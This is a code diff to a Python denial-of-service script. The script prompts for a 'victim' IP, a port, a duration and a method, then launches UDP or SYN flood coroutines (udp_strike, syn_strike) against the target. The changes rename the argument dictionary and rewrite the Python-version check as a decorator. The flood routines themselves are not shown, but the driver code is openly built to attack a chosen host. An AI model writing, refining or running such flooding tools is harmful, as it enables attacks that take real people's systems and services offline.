@@ -99,7 +99,7 @@ except optparse.OptParseError as e:
     stdout.write('\n[!!]\tUnable to parse arguments.')
     raise SystemExit
 
-ARGUMENT_DIC = {
+ARGS = {
 
     'victim/IP address': options.harg,
     'destination/Port': options.darg,
@@ -117,7 +117,6 @@ VERSION = {
 
 
 usr_opt = """\n\n
-REVIEW: Option(s) not given a value are defaulted
 
 Victim  | {victim/IP address} // {}
 _______________________________
@@ -135,37 +134,41 @@ Time    | {time/Seconds}
 _______________________________
 
 Sleep   | {sleep}
-""".format(gethostbyaddr(ARGUMENT_DIC['victim/IP address']), **ARGUMENT_DIC)
-
-
-#   TODO // Add a method that checks if the host is online and that the desired port to flood is open.
-
-
-def check_compatability():
-    'checks if user machine has proper file(s) to run this script.'
-
-    if VERSION['required'][0] < 3 and VERSION['required'][1] < 5:
-
-        print ("\n[!!]\tMissing required Python version!\n"
-               "*\tMust have version {required[3]}+\n"
-               "*\tYou have version {user_version}".format(**VERSION)); raise SystemExit
+""".format(gethostbyaddr(ARGS['victim/IP address']), **ARGS)
 
 
 
-def main():
+
+
+def check_compatibility(run):
+
+    def version(*version):
+
+            updated = {}
+
+            for i in version: updated.update(i)
+            assert updated['user_version'] >= updated['required'][3], "\n[!!]\tMust have at least Python version {required}. You have {user_version}".format(**updated)
+
+            return run(**updated)
+
+    return version
+
+
+@check_compatibility
+def main(required, user_version):
 
     stdout.write(usr_opt); input("\nPRESS ENTER TO CONTINUE. (Ctrl+z to exit)")
 
-    if ARGUMENT_DIC['method/UDP,SYN'] == 'udp'.casefold():
+    if ARGS['method/UDP,SYN'] == 'udp'.casefold():
 
         loop = asyncio.get_event_loop()
-        loop.run_until_complete(udp_strike(**ARGUMENT_DIC))
+        loop.run_until_complete(udp_strike(**ARGS)); assert loop
         loop.close()
 
-    elif ARGUMENT_DIC['method/UDP,SYN'] == 'syn'.casefold():
+    elif ARGS['method/UDP,SYN'] == 'syn'.casefold():
 
         loop = asyncio.get_event_loop()
-        loop.run_until_complete(syn_strike(**ARGUMENT_DIC))
+        loop.run_until_complete(syn_strike(**ARGS)); assert loop
         loop.close()
 
 
@@ -174,6 +177,5 @@ def main():
 if __name__ == '__main__':
     'execute'
 
-    check_compatability()
-    system("clear");main()
-
+    system("clear")
+    main(VERSION)
